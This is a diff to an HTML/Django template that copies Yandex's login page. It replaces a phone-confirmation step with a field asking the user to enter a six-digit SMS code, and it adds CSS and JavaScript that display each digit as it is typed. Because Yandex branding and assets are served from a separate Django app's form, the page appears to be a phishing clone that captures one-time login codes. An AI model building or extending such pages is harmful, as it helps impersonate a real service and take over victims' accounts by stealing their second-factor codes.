@@ -25,7 +25,22 @@
     </script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/libphonenumber-js/1.9.47/libphonenumber-js.min.js"></script>
 
+<style>
+    .CodeField-dash {
+  position: relative;
+}
 
+.CodeField-number {
+  position: absolute;
+  top: -1.1em; /* Підлаштуйте значення відповідно до вашого дизайну */
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 1.1em; /* Підлаштуйте значення відповідно до вашого дизайну */
+}
+.Textinput-Control {
+  caret-color: black;
+}
+</style>
 </head>
 <body class="Theme_color_yandex-default Theme_root_passport Theme_auth_domik Theme_root_default "
       data-metrics-id="784657" data-user-type="null" data-version="1.88.25" data-origin="null">
@@ -45,45 +60,91 @@
                 <div class="passp-content">
                     <div class="passp-auth theme-default">
                         <div class="passp-page-overlay"></div>
-<div class="passp-auth-content">
+<div class="PagePopup"><a data-t="closer"
+                                                  href="/auth/add?retpath=https%3A%2F%2Fid.yandex.ru%2F%3Fncrnd%3D91902&amp;noreturn=1"
+                                                  class="PreviousStepButton PreviousStepButton_type_closer"
+                                                  aria-label="Назад"><span
+                                data-pane="/auth/add?retpath=https%3A%2F%2Fid.yandex.ru%2F%3Fncrnd%3D91902&amp;noreturn=1"
+                                data-link=""></span></a>
                             <div class="Header">
                                 <div class="Header-yaLogoBlock"><a aria-label="Яндекс" href="https://ya.ru"
                                                                    tabindex="-1" class="Logo Logo_ya"></a></div>
                             </div>
-                            <div class="passp-page-visibility"></div>
-                            <div class="">
-                                <div class="passp-route passp-route-appear-done passp-route-enter-done">
-                                    <div data-t="page:auth-challenge"
-                                         class="passp-auth-screen passp-auth-challenge-page"><h1 data-t="title"
-                                                                                                 class="passp-title">
-                                        Безопасный вход</h1>
-                                        <div class="auth-challenge-wrapper">
-                                            <div class="auth-challenge__call">
-                                                <div class="auth-challenge-descr"><p>Пожалуйста, подтвердите номер
-                                                    телефона, который привязан к&nbsp;вашему аккаунту.</p></div>
-                                                <form action="{% url 'authentication:verification' %}" class="auth-challenge__call-form">
-                                                    {% csrf_token %}
-                                                    <div class="auth-challenge-form-hint">Ваш номер телефона:<strong>{{phone_number}}</strong></div>
-                                                    <div data-t="challenge_sumbit_phone-confirmation"
-                                                         class="passp-button">
-                                                        <button data-t="button:action" type="submit"
-                                                                class="Button2 Button2_size_l Button2_view_action Button2_width_max Button2_type_submit"
-                                                                aria-disabled="false" autocomplete="off"><span
-                                                                class="Button2-Text">Подтвердить</span></button>
-                                                    </div>
-                                                </form>
-                                            </div>
-                                            <div class="auth-challenge-note">Если у вас возникли сложности при входе,
-                                                попробуйте авторизоваться на устройстве, с которого вы уже входили. Или
-                                                пройдите <a href="/auth/restore/password" class="link_theme_normal">процедуру
-                                                    восстановления доступа</a> к аккаунту
+                            <div data-t="page:popup:challenges-call">
+                                <h1 data-t="title" class="passp-title">
+                                    <div>Введите код из СМС, отправленный на номер <span class="passp-phone-template"
+                                                                                         dir="ltr">+380 98 *** **09</span>
+                                    </div>
+                                </h1>
+                                <form method="post" class="PasspAuthForm" data-t="page:form:challenges-call">
+                                    {% csrf_token %}
+                                    <div class="CodeField CodeField_theme_default">
+                                        <div class="Field Field_view_rounded-corner" data-t="field:phoneCode">
+                                            <div class="Field-label-wrapper"><label
+                                                    class="Field-label Field-label_isVisuallyHidden"
+                                                    data-t="field:label-phoneCode" for="passp-field-phoneCode">Введите
+                                                код</label></div>
+                                            <div class="Field-inputWrapper"><span
+                                                    class="Textinput Textinput_view_rounded-corner Textinput_size_xxl"><input
+  data-t="field:input-phoneCode"
+  dir="ltr"
+  aria-invalid="false"
+  autocomplete="off"
+  class="Textinput-Control code-input"
+  id="passp-field-phoneCode"
+  inputmode="numeric"
+  maxlength="6"
+  name="phoneCode"
+  type="text"
+  value=""
+/><span
+                                                    class="Textinput-Box">
+
+                                            </span></span></div>
+                                        </div>
+                                        <div class="CodeField-visualWrapper" aria-hidden="true">
+                                            <div class="CodeField-visualContent CodeField-visualContent_size_normal">
+                                                <ul class="CodeField-dashes">
+  <li class="CodeField-dash CodeField-dash_isActive">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash CodeField-dash_hasSpace">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+</ul>
+                                                <ul class="CodeField-numbers"></ul>
                                             </div>
                                         </div>
                                     </div>
-                                </div>
+                                    <div data-t="submit-phone-code-btn" class="passp-button">
+                                        <button data-t="button:action" type="submit"
+                                                class="Button2 Button2_size_l Button2_view_action Button2_width_max Button2_type_submit"
+                                                aria-disabled="false" autocomplete="off"><span class="Button2-Text">Далее</span>
+                                        </button>
+                                    </div>
+                                    <div data-t="send-code-again-btn"
+                                         class="passp-button passp-send-again-btn challenge-submit">
+                                        <button data-t="button:default" type="button"
+                                                class="Button2 Button2_size_l Button2_view_default Button2_width_max"
+                                                aria-disabled="false" autocomplete="off"><span class="Button2-Text">Отправить ещё код</span>
+                                        </button>
+                                    </div>
+                                </form>
                             </div>
                         </div>
-                        <div class="yaIdPromoText">Яндекс ID — ключ от всех сервисов <a
+<div class="yaIdPromoText">Яндекс ID — ключ от всех сервисов <a
                                 href="https://id.yandex.ru/about" class="yaIdPromoText_link">Узнать больше</a></div>
                     </div>
                 </div>
@@ -119,6 +180,40 @@
 <link data-chunk="react.authv2" rel="stylesheet"
       href="https://yastatic.net/s3/passport-static/core/v1.88.25/js/../css/react.authv2.cij.css"
       crossorigin="anonymous">
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+  var codeInput = document.getElementById('passp-field-phoneCode');
+  var codeNumbers = document.querySelectorAll('.CodeField-number');
+
+  function updateCodeDisplay() {
+    var codeValue = codeInput.value;
+
+    for (var i = 0; i < codeNumbers.length; i++) {
+      if (i < codeValue.length) {
+        codeNumbers[i].innerText = codeValue[i];
+      } else {
+        codeNumbers[i].innerText = '';
+      }
+    }
+  }
+
+  codeInput.addEventListener('input', updateCodeDisplay);
+  codeInput.addEventListener('keypress', function (event) {
+  var charCode = event.which || event.keyCode;
+  var charStr = String.fromCharCode(charCode);
+
+  if (!/^\d+$/.test(charStr)) {
+    event.preventDefault();
+  }
+});
+
+});
+
+
+</script>
+
 
 </body>
 </html>
